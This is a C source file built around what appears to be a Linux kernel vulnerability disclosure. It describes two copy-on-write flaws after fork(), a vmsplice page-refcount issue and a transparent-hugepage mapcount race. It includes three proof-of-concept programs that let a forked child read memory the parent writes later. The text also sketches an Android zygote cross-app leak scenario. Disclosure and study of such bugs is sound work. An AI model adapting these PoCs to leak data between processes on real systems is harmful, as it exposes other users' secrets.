/*I've stumbled over two ways in which copy-on-write of anonymous memory after
fork() is currently broken: Page references through the page refcount and a bug
in THP logic.

== Page refcount isn't being accounted for ==
This one's fairly straightforward:
*/

/*----<vmsplice.c>----*/
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <err.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  __res;                      \
})

static void *data;

static void child_fn(void) {
  int pipe_fds[2];
  SYSCHK(pipe(pipe_fds));
  struct iovec iov = {.iov_base = data, .iov_len = 0x1000 };
  SYSCHK(vmsplice(pipe_fds[1], &iov, 1, 0));
  SYSCHK(munmap(data, 0x1000));
  sleep(2);
  char buf[0x1000];
  SYSCHK(read(pipe_fds[0], buf, 0x1000));
  // printf("read string from child: %s\n", buf);
}

int vmsplice_main(void) {
  if (posix_memalign(&data, 0x1000, 0x1000))
    return -1;
  strcpy(data, "BORING DATA");

  pid_t child = SYSCHK(fork());
  if (child == 0) {
    child_fn();
    return 0;
  }

  sleep(1);
  strcpy(data, "THIS IS SECRET");

  int status;
  SYSCHK(wait(&status));
  return 0;
}
//$ gcc -o vmsplice vmsplice.c && ./vmsplice
/*
read string from child: THIS IS SECRET
$
```

As you can see, the fork() child can read memory from the parent by grabbing a
refcounted reference to a page with vmsplice(), then dropping the page from its
pagetables. This is because the CoW fault handler grants the parent write access
to the original page if its mapcount indicates that nobody else has it mapped.

This could potentially have security implications in environments like Android,
where (almost) all apps are forked from a common zygote process. In the
following scenario, this would lead to data leakage between apps:

 - zygote writes to page X (ensuring that any preexisting CoW is broken)
 - zygote forks off an attacker-controlled child process C1
 - C1 grabs page X into a pipe with vmsplice()
 - C1 drops its mapcount on page X
 - zygote forks off a victim child process C2
 - zygote writes to page X (resolving CoW fault by duplicating the page)
 - C2 writes secret data to page X (resolving CoW fault by granting write access
   to the original page)
 - C1 reads secret data from the pipe

However, so far I haven't managed to actually leak data from another app with
this one.


== THP mapcount check is racy ==
This one is somewhat more severe. Basically, there is a race between
__split_huge_pmd_locked() and page_trans_huge_map_swapcount() that can cause the
THP CoW fault path to ignore up to two other mappings if one other process is
concurrently shattering its THP mapping. I think this may have been introduced in commit 6d0a07edd17c ("mm: thp: calculate the mapcount correctly for THP pages during WP faults").

page_trans_huge_map_swapcount() first looks at 4K mapcounts, then looks at the
DoubleMap flag and the compound_mapcount(page).
__split_huge_pmd_locked() can concurrently move references from the
compound mapcount over to the 4K mapcounts.
There are no common locks between the two.
Therefore, essentially, page_trans_huge_map_swapcount() can observe the old
state of the 4K mapcounts (which don't yet account for the other mapping)
combined with the new state of the hugepage mapcount (which doesn't account for
the other mapping anymore).

It is possible for not just one, but two mappings to be ignored because of the
DoubleMap flag: If page_trans_huge_map_swapcount() observes the old state
of the 4K mapcounts, but the new state of the DoubleMap flag, it will
incorrectly subtract 1 from the result in addition to not observing the mapcount
of the __split_huge_pmd_locked() caller.

Here is a PoC that demonstrates the issue with two mappings (testing in a KVM
guest):
*/
/*--------------<thp_munmap.c>>----------*/
#include <sys/mman.h>
#include <err.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/eventfd.h>

int thp_munmap_main(void) {
  volatile char *mapping = mmap((void*)0x200000, 0x200000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
  if (mapping == MAP_FAILED)
    return -1;
  *mapping = 1;
  system("cat /proc/$PPID/smaps | head -n40; echo =======================");

  int efd = eventfd(0, 0);

  unsigned long long iteration = 0;
  while (1) {
    iteration++;
    *mapping = 1;
    pid_t child = fork();
    if (child == -1) return -1;
    if (child == 0) {
      if (munmap((void*)(mapping+0x1000), 0x1f0000)) return -1;

      // wait for parent to tell us to measure and exit
      uint64_t dummy;
      if (eventfd_read(efd, &dummy)) return -1;

      if (*mapping != 1)
        return -1;
      //system("cat /proc/$PPID/smaps | head -n40; echo =======================");
      exit(0);
    }

    *mapping = 2;

    // tell child to continue
    if (eventfd_write(efd, 1)) return -1;

    int status;
    if (waitpid(child, &status, 0) != child) return -1;
  }
  return 0;
}
//user@vm:~/tmp/transhuge$ gcc -o thp_munmap thp_munmap.c

/*-----thp_malloc_large_nosleep.c----*/
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <err.h>
#include <sys/eventfd.h>
#include <sys/poll.h>
#include <sys/wait.h>

int thp_malloc_large_nosleep_main(void) {
  int efd = eventfd(0, 0);

  char *a = malloc(0x1fe000);
  char *b = malloc(0x1fe000);

  // printf("a = %p, b = %p\n", a, b);

  // printf("waiting for keypress...\n");

  // we want khugepaged to create a hugepage that
  // covers parts of `a` and `b` here
  while (1) {
    struct pollfd pollfd = {.fd = 0, .events = POLLIN};
    if (poll(&pollfd, 1, 1000) == 1)
      break;
    memset(a, 'A', 0x1fe000);
    memset(b, 'B', 0x1fe000);
  }

  unsigned long long iteration = 0;
  while (1) {
    iteration++;
    a[0] = 1;
    pid_t child = fork();
    if (child == -1) return -1;
    if (child == 0) {
      // shatter hugepage
      free(b);

      // wait for parent to tell us to measure and exit
      uint64_t dummy;
      if (eventfd_read(efd, &dummy)) return -1;

      if (a[0] != 1)
      break;
        // printf("broken cow: expected 1, got %hhd, in iteration %llu\n",
        //        a[0], iteration);
      exit(0);
    }

    // normally this should copy the hugepage (or fall back to
    // creating a 4K-page copy), but if we win the race it'll
    // write directly to the original page
    a[0] = 2;

    // tell child to continue
    if (eventfd_write(efd, 1)) return -1;

    int status;
    if (waitpid(child, &status, 0) != child) return -1;
  }
  return 0;
}
//$ gcc -O2 -o thp_malloc_large_nosleep thp_malloc_large_nosleep.c

int main(void){
  vmsplice_main();
  thp_munmap_main();
  thp_malloc_large_nosleep_main();
  return 0;
}